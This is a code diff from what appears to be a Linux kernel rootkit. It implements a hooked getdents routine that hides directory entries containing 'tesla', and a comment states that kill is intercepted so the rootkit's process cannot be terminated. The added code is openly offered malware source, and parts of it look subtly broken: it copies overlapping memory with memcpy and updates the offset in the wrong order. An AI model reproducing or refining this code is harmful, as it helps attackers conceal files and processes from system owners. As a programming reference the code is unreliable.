@@ -21,16 +21,33 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 {
   int totalSize = orig_getdents(fd, dirp, count);
 
-  struct linux_dirent *cDirp = kmalloc(totalSize, GFP_KERNEL);
-  If (copy_from_user(cDirp, dirp, totalSize) != 0) {
-    kfree(kernelDirp);
-    return -EACCESS;
+  struct linux_dirent *p1 = kmalloc(totalSize, GFP_KERNEL);
+  struct linux_dirent *p2 = 0;
+  int i = 0;
+
+  if (copy_from_user(p1, dirp, totalSize) != 0) {
+    kfree(p1);
+    return -EACCES;
   }
 
-  struct linux_dirent *nDirp = cDirp;
-  
+  p2 = p1;
 
-    return 0;
+  while (i < totalSize && (p2->d_reclen != 0)) {
+    if (strstr(p2->d_name, "tesla")) {
+      memcpy(p2, (struct linux_dirent *)((char *)p2 + (p2->d_reclen)), totalSize - p2->d_reclen);
+      totalSize = totalSize - (p2->d_reclen);
+    } else {
+      p2 = (struct linux_dirent *)((char *)p2 + (p2->d_reclen));
+      i = i + (p2->d_reclen);
+    }
+  }
+
+  if (copy_to_user(dirp, p1, totalSize) != 0) {
+    kfree(p1);
+    return -EACCES;
+  }
+  kfree(p1);
+  return totalSize;
 }
 
 /* we intercept kill so that our process can not be killed */
